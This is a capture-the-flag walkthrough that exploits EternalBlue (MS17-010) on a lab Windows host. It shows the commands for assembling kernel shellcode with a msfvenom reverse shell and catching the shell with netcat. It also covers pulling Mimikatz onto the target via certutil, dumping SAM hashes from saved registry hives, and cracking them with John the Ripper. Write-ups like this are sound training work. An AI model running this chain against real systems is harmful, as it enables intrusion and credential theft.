CTF Write-up: Blue

Introduction

Most write-ups for this room follow the room's prescribed steps — Metasploit module on EternalBlue, hashdump, JtR. This walkthrough takes the manual route: AutoBlue's exploit chain assembled by hand, Mimikatz uploaded post-foothold for offline SAM extraction, JtR for the cracking step. msfvenom remains in use for the reverse shell payload.

Objective

Gain access, dump the SAM password hashes, crack the non-default user's hash, recover the flags.

Setup

Connect via the VPN.

Step One - Enumeration

Initial nmap scan. -n disables DNS resolution, -sS for TCP SYN, -oX for XML output.

$ nmap -n -v -sS -oX blue_output.xml 10.10.34.160

Truncated output:

445/SMB is the attack surface. Room name and the preceding learning modules both point at EternalBlue. Confirm with the nmap vuln scripts on 445:

$ nmap -n -v --script=vuln -p 445 -oX blue_script_vulns.xml 10.10.34.160

Truncated output:

Confirmed: vulnerable to MS17-010 (CVE-2017-0143 — part of the EternalBlue CVE cluster spanning -0143 through -0148). exploit-db lists multiple available exploits.

The 3ndG4me/AutoBlue repo provides a Metasploit-free EternalBlue exploit chain — the route taken here.

Step Two - Gain Access

AutoBlue ships with eternalblue_kshellcode_x64.asm — x64 assembly source for kernel-mode shellcode (runs at ring 0, full access to hardware and memory). It also ships shell scripts that automate the full payload assembly. Building it manually here for the learning value.

Run shell_prep.sh's NASM step directly:

nasm -f bin shellcode/eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin

Raw .bin output: direct machine code, no headers or metadata.

shell_prep.sh would also generate a reverse shell binary (Meterpreter or plain cmd) and concatenate it with the kernel shellcode. Replicating that pair manually: kernel shellcode handles the privileged execution context, reverse shell binary is the payload that runs after.

Build the reverse shell binary with msfvenom — stageless Windows x64 reverse TCP, raw format.

$ msfvenom -p windows/x64/shell_reverse_tcp LHOST={LOCAL_IP} LPORT=444 -a x64 -f raw -o sc_x64_msf.bin

Concatenate kernel shellcode and reverse shell binaries:

$ cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin

AutoBlue's eternalblue_exploit7.py loads sc_x64.bin into target memory; shellcode executes; reverse shell connects back. Set up the listener:

$ sudo nc -lvnp 444

Run the exploit:

$ python3 eternalblue_exploit7.py 10.10.34.160 sc_x64.bin

Listener catches the shell:

$ sudo nc -lvnp 444
Listening on 0.0.0.0 444
Connection received on 10.10.34.160 49186
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

Step Three - Escalation and Password Dumping

Check shell user context:

C:\Windows\system32>cmd.exe /c whoami
cmd.exe /c whoami
nt authority\system

NT AUTHORITY\SYSTEM — the highest privilege level on Windows, equivalent to root on Linux. Full administrative control on the target.

Upload Mimikatz — post-exploitation tool for credential extraction (password hashes, Kerberos tickets, etc.). Target here: NTLM hashes from the SAM, needed for the cracking step.

Mimikatz binaries are on the GitHub releases page. Browser may block as a dangerous file — wget instead:

wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip

Start a Python HTTP server in the directory containing the Mimikatz executable:

$ python3 -m http.server 8001

From the target shell, pull the executable with certutil:

C:\Windows\system32>certutil -urlcache -split -f http://{LOCAL_IP}:8001/mimikatz.exe C:\Windows\System32\mimikatz.exe
certutil -urlcache -split -f http://{LOCAL_IP}:8001/mimikatz.exe C:\Windows\System32\mimikatz.exe
****  Online  ****
  000000  ...
  108c00
CertUtil: -URLCache command completed successfully.

Mimikatz uploaded. Next: extract NTLM hashes from the SAM hive. The live SAM file is locked by a running Windows process, so direct reads fail. Workaround: export the SAM and SYSTEM registry hives via reg save to standalone files, then dump from those.

C:\Windows\system32>reg save hklm\sam c:\sam
reg save hklm\sam c:\sam
The operation completed successfully.

C:\Windows\System32>reg save hklm\system c:\system
reg save hklm\system c:\system
The operation completed successfully.

The SYSTEM hive holds the SYSKEY (also called the BootKey) — the key Windows uses to encrypt how NTLM hashes are stored inside SAM. SAM alone gives you encrypted hash-blobs; without SYSTEM, Mimikatz can't unwrap them. Both hives are required to extract the raw NTLM hashes — which is the input the cracking step in Step Four operates on.

Launch Mimikatz. Gotcha: architecture must match target — 32-bit Mimikatz on a 64-bit target produces silent privilege failure.

C:\Windows\system32>mimikatz.exe

Dump the hashes from the offline hives:

mimikatz # lsadump::sam /system:C:\system /sam:C:\sam
Domain : JON-PC
SysKey : 55.......
...
...
User : Administrator
    Hash NTLM: 31d6c.........

User : Guest

User : Jon
    Hash NTLM: ffb43............

Save the hashes — needed for the cracking step.

Step Four - Hash Cracking

The challenge specifies the non-default user — "Jon" per the Mimikatz output. SAM-hive provenance and Windows context fix the format as NT hash. (hash-id.py would confirm if needed.) Crack with John the Ripper, format-locked.

Save Jon's hash to a file, then pass to JtR:

$ john --format=NT --fork=8 --wordlist=/usr/share/wordlists/rockyou.txt jon_hash.txt

Cracked:

Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Node numbers 1-8 of 8 (fork)
Note: Passwords longer than 27 rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
alq.......... (?)

Solution

Flag 1:

C:\>type flag1.txt

Flag 2:

C:\Windows\System32\config>type flag2.txt

Flag 3:

C:\Users\Jon\Documents>type flag3.txt
type flag3.txt
flag{XXXXX}

Conclusion

Approach: full manual EternalBlue chain rather than the Metasploit module shown in most write-ups for this room. Demonstrates payload assembly (kernel shellcode + reverse shell concatenation), the Mimikatz architecture-matching gotcha, and offline SAM extraction via registry hive export.
